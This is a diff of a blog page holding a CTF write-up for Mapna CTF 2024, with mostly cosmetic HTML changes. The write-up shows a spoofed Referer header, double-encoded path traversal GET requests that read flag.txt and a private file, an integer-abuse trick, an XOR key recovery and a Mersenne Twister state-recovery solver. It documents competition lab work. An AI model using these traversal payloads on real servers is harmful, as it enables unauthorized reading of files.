@@ -107,26 +107,31 @@ Novel Reader There is a path traversal vulnerability which can be used to retrie
   <link rel="apple-touch-icon" href="https://berliangabriel.github.io/apple-touch-icon.png" />
 
   
-  <meta name="generator" content="Hugo 0.92.2" />
+  <meta name="generator" content="Hugo 0.127.0">
 
   
   
   
   
   
-  <meta itemprop="name" content="Mapna CTF 2024">
-<meta itemprop="description" content="Web Flag Holding The flag can be found by modifying the GET request as follow:
-Host: 18.184.219.56:8080 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36 Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://flagland.internal/ Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.9 Connection: close FLAG: MAPNA{533m5-l1k3-y0u-kn0w-h77p-1836a2f}
-Novel Reader There is a path traversal vulnerability which can be used to retrieve the 1st flag. Only checking the path name is starting with &lsquo;public&rsquo; is not sufficient to prevent path traversal:"><meta itemprop="datePublished" content="2024-01-21T21:50:22+08:00" />
-<meta itemprop="dateModified" content="2024-01-21T21:50:22+08:00" />
-<meta itemprop="wordCount" content="386">
-<meta itemprop="keywords" content="" />
+
+
   
-  <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Mapna CTF 2024"/>
-<meta name="twitter:description" content="Web Flag Holding The flag can be found by modifying the GET request as follow:
+  
+  <meta itemprop="name" content="Mapna CTF 2024">
+  <meta itemprop="description" content="Web Flag Holding The flag can be found by modifying the GET request as follow:
 Host: 18.184.219.56:8080 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36 Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://flagland.internal/ Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.9 Connection: close FLAG: MAPNA{533m5-l1k3-y0u-kn0w-h77p-1836a2f}
-Novel Reader There is a path traversal vulnerability which can be used to retrieve the 1st flag. Only checking the path name is starting with &lsquo;public&rsquo; is not sufficient to prevent path traversal:"/>
+Novel Reader There is a path traversal vulnerability which can be used to retrieve the 1st flag. Only checking the path name is starting with ‘public’ is not sufficient to prevent path traversal:">
+  <meta itemprop="datePublished" content="2024-01-21T21:50:22+08:00">
+  <meta itemprop="dateModified" content="2024-01-21T21:50:22+08:00">
+  <meta itemprop="wordCount" content="386">
+  
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Mapna CTF 2024">
+  <meta name="twitter:description" content="Web Flag Holding The flag can be found by modifying the GET request as follow:
+Host: 18.184.219.56:8080 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36 Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://flagland.internal/ Accept-Encoding: gzip, deflate, br Accept-Language: en-US,en;q=0.9 Connection: close FLAG: MAPNA{533m5-l1k3-y0u-kn0w-h77p-1836a2f}
+Novel Reader There is a path traversal vulnerability which can be used to retrieve the 1st flag. Only checking the path name is starting with ‘public’ is not sufficient to prevent path traversal:">
 
   
   
@@ -141,7 +146,7 @@ Novel Reader There is a path traversal vulnerability which can be used to retrie
   <div class="relative z-50 mr-auto flex items-center">
     <a
       class="-translate-x-[1px] -translate-y-[1px] text-2xl font-semibold"
-      href="https://berliangabriel.github.io"
+      href="https://berliangabriel.github.io/"
       >Berlian Gabriel</a
     >
     <div
@@ -287,21 +292,20 @@ Referer: http://flagland.internal/
 Accept-Encoding: gzip, deflate, br
 Accept-Language: en-US,en;q=0.9
 Connection: close
-
 </code></pre><p>FLAG: <code>MAPNA{533m5-l1k3-y0u-kn0w-h77p-1836a2f}</code></p>
 <h2 id="novel-reader">Novel Reader</h2>
 <p>There is a path traversal vulnerability which can be used to retrieve the 1st flag.
 Only checking the path name is starting with &lsquo;public&rsquo; is not sufficient to prevent path traversal:</p>
-<pre tabindex="0"><code>    if(not name.startswith('public/')):
-        return {'success': False, 'msg': 'You can only read public novels!'}, 400
+<pre tabindex="0"><code>    if(not name.startswith(&#39;public/&#39;)):
+        return {&#39;success&#39;: False, &#39;msg&#39;: &#39;You can only read public novels!&#39;}, 400
 </code></pre><p>In order to trigger the path traversal, double encoding of <code>../</code> is needed.</p>
 <pre tabindex="0"><code>GET /api/read/public/%252e%252e%252f%252e%252e%252fflag.txt HTTP/1.1
 Host: 3.64.250.135:9000
 </code></pre><p>FLAG: <code>MAPNA{uhhh-1-7h1nk-1-f0r607-70-ch3ck-cr3d17&gt;0-4b331d4b}</code></p>
 <h2 id="novel-reader-2">Novel Reader 2</h2>
 <p>The words_balance can be set to -1. Coupled with this particular implementation to read the content of the txt file,</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">.</span>join(buf[<span style="color:#ae81ff">0</span>:session[<span style="color:#e6db74">&#39;words_balance&#39;</span>]])
-</code></pre></div><p>a txt file which contains more than 11 words can be read. In fact, by setting words_balance to -1, the content of a txt file can be read until its penultimate word.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">.</span>join(buf[<span style="color:#ae81ff">0</span>:session[<span style="color:#e6db74">&#39;words_balance&#39;</span>]])
+</span></span></code></pre></div><p>a txt file which contains more than 11 words can be read. In fact, by setting words_balance to -1, the content of a txt file can be read until its penultimate word.</p>
 <p>Combining the words_balance value of -1, with the previous path traversal method, the 2nd flag can be retrieved.</p>
 <pre tabindex="0"><code>GET /api/read/public/%252e%252e%252fprivate/A-Secret-Tale.txt HTTP/1.1
 Host: 3.64.250.135:9000
@@ -309,14 +313,14 @@ Host: 3.64.250.135:9000
 <h1 id="crypto">Crypto</h1>
 <h2 id="what-next">What Next?</h2>
 <p>The encryption is obtained by XOR-ing KEY with the secret message:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">c <span style="color:#f92672">=</span> KEY <span style="color:#f92672">^</span> m
-</code></pre></div><p>The value of KEY and encryption result is provided in the output:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;KEY = </span><span style="color:#e6db74">{</span>KEY<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
-print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;enc = </span><span style="color:#e6db74">{</span>enc<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
-</code></pre></div><p>Hence, the secret message can be recovered by just XOR-ing the KEY with encryption result:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: long_to_bytes(KEY<span style="color:#f92672">^</span>enc)
-Out[<span style="color:#ae81ff">1</span>]: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;MAPNA{R_U_MT19937_PRNG_Predictor?}&#39;</span>
-</code></pre></div><p>FLAG: <code>MAPNA{R_U_MT19937_PRNG_Predictor?}</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>c <span style="color:#f92672">=</span> KEY <span style="color:#f92672">^</span> m
+</span></span></code></pre></div><p>The value of KEY and encryption result is provided in the output:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;KEY = </span><span style="color:#e6db74">{</span>KEY<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;enc = </span><span style="color:#e6db74">{</span>enc<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span></code></pre></div><p>Hence, the secret message can be recovered by just XOR-ing the KEY with encryption result:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>In [<span style="color:#ae81ff">1</span>]: long_to_bytes(KEY<span style="color:#f92672">^</span>enc)
+</span></span><span style="display:flex;"><span>Out[<span style="color:#ae81ff">1</span>]: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;MAPNA{R_U_MT19937_PRNG_Predictor?}&#39;</span>
+</span></span></code></pre></div><p>FLAG: <code>MAPNA{R_U_MT19937_PRNG_Predictor?}</code></p>
 <h2 id="what-next-ii">What Next II?</h2>
 <p>From the given output, there are 79 x 256 bits of number that can be recovered, which are the result of pseudorandom generation using getrandbits(). This is equivalent to 632 x 32 bits of number, hence it can be supplied to RandCrack, and the state of Mersenne Twister matrix can be inferred, and the subsequent pseudo-randomly generated number can be guessed, and KEY can be retrieved. Below is the solver:</p>
 <pre tabindex="0"><code>R=[]
@@ -328,7 +332,7 @@ for i in range (1,80):
 for n in R:
     s = bin(n)[2:]
         while(len(s) &lt; 256):
-            s = '0' + s
+            s = &#39;0&#39; + s
         split=[s[i:i + 32] for i in range(0, len(s), 32)]
         for b in reversed(split):
             Rb.append(b)
@@ -389,7 +393,7 @@ print(long_to_bytes(enc^KEY))
 >
   <div class="mr-auto">
     &copy; 2024
-    <a class="link" href="https://berliangabriel.github.io">Berlian Gabriel</a>
+    <a class="link" href="https://berliangabriel.github.io/">Berlian Gabriel</a>
   </div>
   <a class="link mx-6" href="https://gohugo.io/" rel="noopener" target="_blank"
     >Powered by Hugo️️</a
